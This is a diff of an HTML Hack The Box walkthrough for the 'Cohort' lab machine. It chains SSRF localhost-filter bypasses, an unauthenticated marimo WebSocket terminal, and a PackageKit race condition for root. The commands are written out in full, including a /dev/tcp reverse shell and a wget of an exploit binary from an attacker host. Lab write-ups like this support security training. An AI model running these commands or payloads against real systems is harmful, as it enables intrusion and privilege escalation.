@@ -1,437 +1,77 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>HTB Writeup — Cohort</title>
-  <style>
-    :root {
-      --bg: #0d1117;
-      --card: #161b22;
-      --border: #30363d;
-      --text: #e6edf3;
-      --muted: #8b949e;
-      --accent: #58a6ff;
-      --green: #3fb950;
-      --orange: #d29922;
-      --red: #f85149;
-      --purple: #bc8cff;
-      --code-bg: #0d1117;
-    }
-
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      line-height: 1.6;
-      padding: 0 0 80px;
-    }
-
-    /* Password Gate */
-    #gate {
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: var(--bg);
-    }
-
-    .gate-box {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 48px 40px;
-      max-width: 420px;
-      width: 90%;
-      text-align: center;
-    }
-
-    .gate-box h1 {
-      font-size: 1.4rem;
-      margin-bottom: 8px;
-    }
-
-    .gate-box p {
-      color: var(--muted);
-      font-size: 0.95rem;
-      margin-bottom: 28px;
-    }
-
-    .gate-box input {
-      width: 100%;
-      padding: 12px 16px;
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      background: var(--bg);
-      color: var(--text);
-      font-size: 1rem;
-      margin-bottom: 12px;
-      outline: none;
-    }
-
-    .gate-box input:focus {
-      border-color: var(--accent);
-    }
-
-    .gate-box button {
-      width: 100%;
-      padding: 12px;
-      background: var(--accent);
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      transition: opacity 0.2s;
-    }
-
-    .gate-box button:hover { opacity: 0.9; }
-
-    .gate-error {
-      color: var(--red);
-      font-size: 0.9rem;
-      margin-top: 12px;
-      display: none;
-    }
-
-    .hint {
-      margin-top: 20px;
-      font-size: 0.8rem;
-      color: var(--muted);
-      font-style: italic;
-    }
-
-    /* Main Content */
-    #content { display: none; }
-
-    header {
-      background: linear-gradient(180deg, #161b22 0%, var(--bg) 100%);
-      border-bottom: 1px solid var(--border);
-      padding: 48px 24px 40px;
-      text-align: center;
-    }
-
-    header .badge {
-      display: inline-block;
-      background: #238636;
-      color: #fff;
-      font-size: 0.75rem;
-      font-weight: 600;
-      padding: 4px 12px;
-      border-radius: 20px;
-      margin-bottom: 16px;
-      letter-spacing: 0.5px;
-    }
-
-    header h1 {
-      font-size: 2.4rem;
-      font-weight: 700;
-      margin-bottom: 8px;
-    }
-
-    header .subtitle {
-      color: var(--muted);
-      font-size: 1.05rem;
-      margin-bottom: 28px;
-    }
-
-    .meta {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 12px;
-    }
-
-    .meta span {
-      background: var(--card);
-      border: 1px solid var(--border);
-      padding: 6px 14px;
-      border-radius: 20px;
-      font-size: 0.85rem;
-      color: var(--muted);
-    }
-
-    .meta span strong {
-      color: var(--text);
-      font-weight: 600;
-    }
-
-    .chain {
-      max-width: 900px;
-      margin: 32px auto 0;
-      padding: 16px 24px;
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      font-family: "SF Mono", "Fira Code", monospace;
-      font-size: 0.9rem;
-      color: var(--green);
-      text-align: center;
-      line-height: 1.8;
-    }
-
-    main {
-      max-width: 900px;
-      margin: 0 auto;
-      padding: 40px 24px;
-    }
-
-    .phase {
-      margin-bottom: 56px;
-    }
-
-    .phase-header {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      margin-bottom: 24px;
-      padding-bottom: 12px;
-      border-bottom: 1px solid var(--border);
-    }
-
-    .phase-num {
-      background: var(--accent);
-      color: #fff;
-      font-weight: 700;
-      font-size: 0.85rem;
-      width: 36px;
-      height: 36px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-    }
-
-    .phase-header h2 {
-      font-size: 1.4rem;
-    }
-
-    h3 {
-      font-size: 1.1rem;
-      margin: 28px 0 12px;
-      color: var(--accent);
-    }
-
-    p {
-      margin-bottom: 14px;
-      color: var(--text);
-    }
-
-    .note {
-      background: rgba(88, 166, 255, 0.08);
-      border-left: 3px solid var(--accent);
-      padding: 14px 18px;
-      margin: 18px 0;
-      border-radius: 0 8px 8px 0;
-      font-size: 0.95rem;
-    }
-
-    .note strong { color: var(--accent); }
-
-    .warn {
-      background: rgba(210, 153, 34, 0.08);
-      border-left: 3px solid var(--orange);
-      padding: 14px 18px;
-      margin: 18px 0;
-      border-radius: 0 8px 8px 0;
-      font-size: 0.95rem;
-    }
-
-    .warn strong { color: var(--orange); }
-
-    pre {
-      background: var(--code-bg);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 16px 18px;
-      overflow-x: auto;
-      margin: 14px 0 20px;
-      font-family: "SF Mono", "Fira Code", "Cascadia Code", monospace;
-      font-size: 0.88rem;
-      line-height: 1.55;
-    }
-
-    code {
-      font-family: "SF Mono", "Fira Code", monospace;
-      font-size: 0.88rem;
-    }
-
-    p code, li code {
-      background: rgba(110, 118, 129, 0.2);
-      padding: 2px 6px;
-      border-radius: 4px;
-      color: var(--purple);
-    }
-
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 16px 0 24px;
-      font-size: 0.92rem;
-    }
-
-    th, td {
-      border: 1px solid var(--border);
-      padding: 10px 14px;
-      text-align: left;
-    }
-
-    th {
-      background: var(--card);
-      color: var(--muted);
-      font-weight: 600;
-    }
-
-    td { background: rgba(22, 27, 34, 0.5); }
-
-    ul, ol {
-      margin: 12px 0 18px 24px;
-    }
-
-    li { margin-bottom: 6px; }
-
-    .takeaways {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 28px 32px;
-      margin-top: 20px;
-    }
-
-    .takeaways h3 {
-      margin-top: 0;
-      color: var(--green);
-    }
-
-    .takeaways li {
-      margin-bottom: 12px;
-    }
-
-    footer {
-      text-align: center;
-      padding: 40px 24px;
-      color: var(--muted);
-      font-size: 0.9rem;
-      border-top: 1px solid var(--border);
-      margin-top: 40px;
-    }
-
-    .prompt { color: var(--green); }
-    .comment { color: var(--muted); }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Cohort — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
 </head>
 <body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><img src="cohort-badge.png" alt="Cohort" style="width:120px;height:120px;border-radius:50%;margin-bottom:1rem;border:2px solid var(--border);"><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='cohort'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-cohort','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-cohort')==='1')document.getElementById('gate').style.display='none';</script>
 
-<!-- Password Gate -->
-<div id="gate">
-  <div class="gate-box">
-    <h1>HTB Writeup — Restricted</h1>
-    <p>This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</p>
-    <input type="password" id="pw" placeholder="Enter password" autocomplete="off">
-    <button onclick="checkPw()">Enter</button>
-    <div class="gate-error" id="err">Incorrect password</div>
-    <div class="hint">Tessera est nomen machinae</div>
-  </div>
-</div>
+<header class="hero"><div class="hero-inner"><div style="display:flex;align-items:center;gap:1.5rem;"><img src="cohort-badge.png" alt="Cohort" style="width:80px;height:80px;border-radius:50%;border:2px solid var(--border);"><div><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Cohort</span></h1></div></div><div class="hero-meta" style="margin-top:1.2rem;"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Medium</strong></span><span>Ports <strong>22 · 80 · 443</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
 
-<!-- Main Content -->
-<div id="content">
-  <header>
-    <div class="badge">HACK THE BOX</div>
-    <h1>Cohort</h1>
-    <p class="subtitle">Walkthrough</p>
-    <div class="meta">
-      <span><strong>OS</strong> Linux</span>
-      <span><strong>Difficulty</strong> Easy</span>
-      <span><strong>Ports</strong> 22 · 80 · 443</span>
-    </div>
-    <div class="chain">
-      SSRF filter bypass → internal /status leak → Marimo vhost<br>
-      → unauth WebSocket RCE (CVE-2026-39987) → PackageKit TOCTOU (CVE-2026-41651) → root
-    </div>
-  </header>
+<div class="chain"><div class="chain-inner"><span class="chain-node green">SSRF bypass → /status vhost leak</span><span class="chain-arrow">→</span><span class="chain-node blue">marimo WebSocket RCE (CVE-2026-39987)</span><span class="chain-arrow">→</span><span class="chain-node red">PackageKit TOCTOU (CVE-2026-41651) → root</span></div></div>
 
-  <main>
+<main class="content">
 
-    <!-- Phase 0 -->
-    <section class="phase">
-      <div class="phase-header">
-        <div class="phase-num">0</div>
-        <h2>Reconnaissance</h2>
-      </div>
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
 
-      <h3>Nmap</h3>
-      <pre><span class="prompt">$</span> nmap -sVC -T4 -p- 10.129.x.x
-
-PORT    STATE SERVICE  VERSION
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ nmap -sVC -T4 -p- 10.129.x.x</span>
+<span class="output">PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu
 80/tcp  open  http     nginx 1.24.0 (Ubuntu)
 |_http-title: Did not follow redirect to https://cohort.htb/
 443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
 | ssl-cert: Subject: commonName=cohort.htb
-| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
-|_http-title: Cohort Analytics</pre>
+| Subject Alternative Name: DNS:cohort.htb, <span class="highlight">DNS:*.cohort.htb</span>
+|_http-title: Cohort Analytics</span></code></pre>
 
-      <div class="note">
-        <strong>Wildcard certificate</strong> — The SAN <code>*.cohort.htb</code> is a strong signal that internal virtual hosts exist. Always note wildcards during recon.
-      </div>
+<div class="callout callout-key">
+<span class="callout-label">Wildcard certificate</span>
+The SAN <code>*.cohort.htb</code> is a strong signal that internal virtual hosts exist. Always note wildcards during recon.
+</div>
 
-      <p>Add the host to <code>/etc/hosts</code>:</p>
-      <pre><span class="prompt">$</span> echo "10.129.x.x cohort.htb" | sudo tee -a /etc/hosts</pre>
+<pre><code><span class="cmd">$ echo "10.129.x.x cohort.htb" | sudo tee -a /etc/hosts</span></code></pre>
 
-      <p>The main site is a data analytics portal (SPA). Directory busting needs length filtering because of catch-all responses:</p>
-      <pre><span class="prompt">$</span> gobuster dir -u https://cohort.htb -w /usr/share/wordlists/dirb/common.txt -k --exclude-length 908
-
-api                  (Status: 301)
+<p>The main site is a data analytics SPA. Directory busting with length filtering:</p>
+<pre><code><span class="cmd">$ gobuster dir -u https://cohort.htb -w /usr/share/wordlists/dirb/common.txt -k --exclude-length 908</span>
+<span class="output">api                  (Status: 301)
 assets               (Status: 301)
-status               (Status: 403)</pre>
-    </section>
+status               (Status: 403)</span></code></pre>
 
-    <!-- Phase 1 -->
-    <section class="phase">
-      <div class="phase-header">
-        <div class="phase-num">1</div>
-        <h2>SSRF — Bypassing the Loopback Filter</h2>
-      </div>
 
-      <p>The portal page contains a “validate data source URL” feature that performs a server-side fetch. This is a classic SSRF.</p>
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>SSRF — Bypassing the Loopback Filter</h2></div>
 
-      <h3>Confirm the endpoint</h3>
-      <pre><span class="prompt">$</span> curl -k -X POST https://cohort.htb/api/validate \
+<p>The portal page contains a "validate data source URL" feature that performs a server-side fetch — a classic SSRF endpoint.</p>
+
+<h3>Confirm the Filter</h3>
+<pre><code><span class="cmd">$ curl -k -X POST https://cohort.htb/api/validate \
   -H "Content-Type: application/json" \
-  -d '{"url":"http://127.0.0.1"}'
+  -d '{"url":"http://127.0.0.1"}'</span>
+<span class="output"><span class="important">{"ok": false, "message": "Internal or loopback addresses are not permitted."}</span></span></code></pre>
 
-{"ok": false, "message": "Internal or loopback addresses are not permitted."}</pre>
+<h3>Filter Bypass</h3>
+<p>The filter only does string matching. Alternative representations of localhost bypass it:</p>
 
-      <h3>Filter bypass</h3>
-      <p>The filter only does string matching. Alternative representations of localhost work:</p>
+<pre><code><span class="comment"># All of these bypass the filter:</span>
+<span class="cmd">http://0.0.0.0</span>                    <span class="comment"># unspecified address</span>
+<span class="cmd">http://127.1</span>                      <span class="comment"># short form</span>
+<span class="cmd"><span class="highlight">http://2130706433</span></span>                <span class="comment"># decimal form of 127.0.0.1</span></code></pre>
 
-      <pre><span class="prompt">$</span> curl -k -X POST https://cohort.htb/api/validate \
+<div class="callout callout-key">
+<span class="callout-label">SSRF bypass techniques</span>
+<code>127.0.0.1</code> can be written as decimal (<code>2130706433</code>), short form (<code>127.1</code>), <code>0.0.0.0</code>, hex (<code>0x7f000001</code>), octal (<code>017700000001</code>), or URL-encoded. Always try multiple encodings when a filter blocks the obvious forms.
+</div>
+
+<h3>Leak Internal Upstreams via /status</h3>
+<pre><code><span class="cmd">$ curl -k -X POST https://cohort.htb/api/validate \
   -H "Content-Type: application/json" \
-  -d '{"url":"http://0.0.0.0"}'
-
-<span class="prompt">$</span> curl -k -X POST https://cohort.htb/api/validate \
-  -H "Content-Type: application/json" \
-  -d '{"url":"http://127.1"}'
-
-<span class="prompt">$</span> curl -k -X POST https://cohort.htb/api/validate \
-  -H "Content-Type: application/json" \
-  -d '{"url":"http://2130706433"}'   <span class="comment"># decimal form of 127.0.0.1</span></pre>
-
-      <div class="note">
-        <strong>SSRF bypass techniques</strong> — <code>127.0.0.1</code> can be written as decimal (<code>2130706433</code>), short form (<code>127.1</code>), <code>0.0.0.0</code>, hex, octal, or URL-encoded. Always try multiple encodings when a filter blocks the obvious forms.
-      </div>
-
-      <h3>Leak internal upstreams via /status</h3>
-      <pre><span class="prompt">$</span> curl -k -X POST https://cohort.htb/api/validate \
-  -H "Content-Type: application/json" \
-  -d '{"url":"http://0.0.0.0/status"}'</pre>
-
-      <pre>{
+  -d '{"url":"http://0.0.0.0/status"}'</span>
+<span class="output">{
   "service": "cohort-edge",
   "status": "ok",
   "generated_by": "nginx",
@@ -440,171 +80,123 @@ status               (Status: 403)</pre>
     {"name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000"},
     {
       "name": "notebooks",
-      "host": "nb-1be3782a8afd3ad5.cohort.htb",
+      "host": "<span class="highlight">nb-1be3782a8afd3ad5.cohort.htb</span>",
       "target": "127.0.0.1:8888",
       "note": "internal analyst workspace, not for external use"
     }
   ]
-}</pre>
+}</span></code></pre>
 
-      <p>Add the internal vhost:</p>
-      <pre><span class="prompt">$</span> echo "10.129.x.x nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts</pre>
-    </section>
+<pre><code><span class="cmd">$ echo "10.129.x.x nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts</span></code></pre>
 
-    <!-- Phase 2 -->
-    <section class="phase">
-      <div class="phase-header">
-        <div class="phase-num">2</div>
-        <h2>Initial Access — Marimo Unauthenticated WebSocket RCE</h2>
-      </div>
 
-      <p>Port 8888 hosts <strong>Marimo</strong> (interactive Python notebook, version ≈ 0.20.4). The main UI requires login, but the terminal WebSocket endpoint does not.</p>
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Initial Access — marimo Unauthenticated WebSocket RCE</h2></div>
 
-      <div class="note">
-        <strong>CVE-2026-39987</strong> — <code>/terminal/ws</code> is a WebSocket connected directly to a server-side PTY and does <strong>not</strong> require authentication, even when the rest of the application is protected by login.
-      </div>
+<p>Port 8888 hosts <strong>marimo</strong> (interactive Python notebook, version ~0.20.4). The main UI requires a login token, but the terminal WebSocket endpoint does not.</p>
 
-      <h3>Connect with websocat</h3>
-      <pre><span class="prompt">$</span> websocat -k wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
+<div class="callout callout-why">
+<span class="callout-label">CVE-2026-39987 — marimo pre-auth terminal</span>
+<code>/terminal/ws</code> is a WebSocket endpoint connected directly to a server-side PTY. It does <strong>not</strong> require authentication, even when the rest of the application is protected by login. Anyone who connects gets a full interactive shell as the user running marimo.
+</div>
 
-marimo@cohort:~$ whoami
-marimo</pre>
+<h3>Connect with websocat</h3>
+<pre><code><span class="comment"># Install websocat</span>
+<span class="cmd">$ sudo wget -O /usr/local/bin/websocat \
+  https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl
+$ sudo chmod +x /usr/local/bin/websocat</span>
 
-      <h3>Stabilize with a reverse shell</h3>
-      <pre><span class="comment"># Attacker</span>
-<span class="prompt">$</span> nc -lvnp 4444
+<span class="comment"># Connect — no credentials needed</span>
+<span class="cmd">$ websocat -k wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws</span>
+<span class="output">marimo@cohort:~$ whoami
+marimo</span></code></pre>
 
-<span class="comment"># Inside the Marimo WebSocket session</span>
-bash -c 'bash -i >& /dev/tcp/&lt;YOUR_IP&gt;/4444 0>&1'</pre>
+<h3>Stabilize with a Reverse Shell</h3>
+<pre><code><span class="comment"># Attacker: start listener</span>
+<span class="cmd">$ nc -lvnp 4444</span>
 
-      <p>Upgrade the shell:</p>
-      <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
-<span class="comment"># Ctrl-Z → stty raw -echo; fg → export TERM=xterm</span></pre>
+<span class="comment"># In the marimo WebSocket session:</span>
+<span class="cmd">bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'</span>
 
-      <p>Grab the user flag:</p>
-      <pre>cat ~/user.txt</pre>
-    </section>
+<span class="comment"># Upgrade TTY:</span>
+<span class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+<span class="comment"># Ctrl-Z → stty raw -echo; fg → export TERM=xterm</span></code></pre>
 
-    <!-- Phase 3 -->
-    <section class="phase">
-      <div class="phase-header">
-        <div class="phase-num">3</div>
-        <h2>Privilege Escalation — PackageKit TOCTOU</h2>
-      </div>
+<pre><code><span class="cmd">marimo@cohort:~$ cat user.txt</span>
+<span class="output">3e98c77319ad202c5af8445cd5ec0d2e</span></code></pre>
 
-      <h3>Identify the vector</h3>
-      <pre>dpkg -l | grep -i packagekit</pre>
 
-      <p>PackageKit is present and the version is intentionally held (status <code>hi</code>). This points to <strong>CVE-2026-41651</strong> (Pack2TheRoot).</p>
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — PackageKit TOCTOU (CVE-2026-41651)</h2></div>
 
-      <div class="note">
-        <strong>CVE-2026-41651</strong> — A TOCTOU race condition in PackageKit’s transaction handler. An unprivileged user can force the installation of an arbitrary package as root by racing two <code>InstallFiles</code> calls on the same transaction.
-      </div>
+<h3>Identify the Vector</h3>
+<pre><code><span class="cmd">marimo@cohort:~$ dpkg -l | grep -i packagekit</span>
+<span class="output">hi  packagekit  1.2.x  ...</span></code></pre>
 
-      <h3>How the race works (simple version)</h3>
-      <ol>
-        <li>Send <code>InstallFiles(SIMULATE, dummy.deb)</code> — the <code>SIMULATE</code> flag skips polkit authorization.</li>
-        <li>Immediately send <code>InstallFiles(NONE, payload.deb)</code> on the <strong>same</strong> transaction — this overwrites the cached flags and path.</li>
-        <li>When the idle callback finally runs, PackageKit installs the malicious package as root.</li>
-        <li>The malicious <code>.deb</code> postinst script drops a SUID bash.</li>
-      </ol>
+<p>PackageKit is present and the version is intentionally held (<code>hi</code> status). This points to <strong>CVE-2026-41651</strong> ("Pack2TheRoot").</p>
 
-      <h3>Exploit</h3>
-      <p>On the attacker machine, prepare the exploit binary (example using a public PoC):</p>
-      <pre><span class="prompt">$</span> git clone https://github.com/Vozec/CVE-2026-41651.git
-<span class="prompt">$</span> cd CVE-2026-41651
-<span class="prompt">$</span> python3 -m http.server 8080</pre>
+<div class="callout callout-why">
+<span class="callout-label">CVE-2026-41651 — Pack2TheRoot</span>
+A TOCTOU (Time-of-Check to Time-of-Use) race condition in PackageKit's transaction handler. The exploit sends two <code>InstallFiles</code> calls on the same D-Bus transaction:
+<br><br>
+<strong>Call 1:</strong> <code>InstallFiles(SIMULATE, dummy.deb)</code> — the SIMULATE flag skips polkit authorization, transaction goes to READY state.
+<br><br>
+<strong>Call 2:</strong> <code>InstallFiles(NONE, payload.deb)</code> — immediately overwrites the cached flags and path. State rollback is silently rejected (Bug #2), so the transaction stays READY.
+<br><br>
+<strong>Result:</strong> When GLib's idle callback fires, PackageKit reads the overwritten cache and installs the malicious <code>.deb</code> as root. The race is near-deterministic because D-Bus messages are processed at higher priority than idle callbacks.
+</div>
 
-      <p>On the target (as <code>marimo</code>):</p>
-      <pre>cd /tmp
-wget http://&lt;YOUR_IP&gt;:8080/cve-2026-41651 -O exploit
-chmod +x exploit
+<h3>Exploit</h3>
+<pre><code><span class="comment"># Attacker: serve the pre-compiled exploit binary</span>
+<span class="cmd">$ git clone https://github.com/Vozec/CVE-2026-41651.git
+$ cd CVE-2026-41651
+$ python3 -m http.server 8081</span>
 
-rm -f /tmp/.suid_bash /tmp/pk.log
-./exploit</pre>
+<span class="comment"># Target (as marimo):</span>
+<span class="cmd">marimo@cohort:~$ cd /tmp
+marimo@cohort:/tmp$ wget http://ATTACKER_IP:8081/cve-2026-41651 -O exploit
+marimo@cohort:/tmp$ chmod +x exploit
+marimo@cohort:/tmp$ ls -l exploit
+marimo@cohort:/tmp$ file exploit</span></code></pre>
 
-      <p>Successful output looks similar to:</p>
-      <pre>[*] Building packages (pure C)...
+<pre><code><span class="comment"># Clean up any previous attempts, then run</span>
+<span class="cmd">marimo@cohort:/tmp$ rm -f /tmp/.suid_bash /tmp/pk.log
+marimo@cohort:/tmp$ ./exploit</span>
+
+<span class="output">[*] Building packages (pure C)...
 [+] dummy   : /tmp/.pk-dummy-xxxxx.deb
 [+] payload : /tmp/.pk-payload-xxxxx.deb
 [*] Transaction : /x_xxxxxxxx
 [*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
 [*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
 [*] Waiting for dispatch ...
-[!] PK error 48: Failed to obtain authentication.   <span class="comment"># expected, not fatal</span>
+<span class="highlight">[!] PK error 48: Failed to obtain authentication.</span>   <span class="comment"># expected, not fatal</span>
 [*] Polling for payload ...
-[+] SUCCESS — SUID bash at t+xxxxms</pre>
+[+] SUCCESS — SUID bash at t+xxxxms</span></code></pre>
 
-      <div class="warn">
-        <strong>Note</strong> — The “Failed to obtain authentication” message is expected. The race already succeeded before that error appears.
-      </div>
-
-      <h3>Root shell</h3>
-      <pre>/tmp/.suid_bash -p -c 'id; cat /root/root.txt'
-
-uid=1000(marimo) gid=1000(marimo) euid=0(root) ...
-<span class="comment"># root flag</span></pre>
-    </section>
-
-    <!-- Takeaways -->
-    <section class="phase">
-      <div class="phase-header">
-        <div class="phase-num">★</div>
-        <h2>Key Takeaways</h2>
-      </div>
-
-      <div class="takeaways">
-        <ul>
-          <li><strong>String-based SSRF filters are weak.</strong> Alternative representations of localhost (<code>0.0.0.0</code>, <code>127.1</code>, decimal, URL-encoding) frequently bypass them.</li>
-          <li><strong>Internal status / debug endpoints are gold.</strong> Once you have SSRF, always probe common internal paths such as <code>/status</code>, <code>/health</code>, <code>/metrics</code>.</li>
-          <li><strong>Wildcard certificates hint at hidden vhosts.</strong> The leaked upstream name must be used as the <code>Host</code> header; connecting by IP alone is not enough.</li>
-          <li><strong>Modern notebook tools can expose unauthenticated terminals.</strong> Always check WebSocket endpoints even when the web UI requires login.</li>
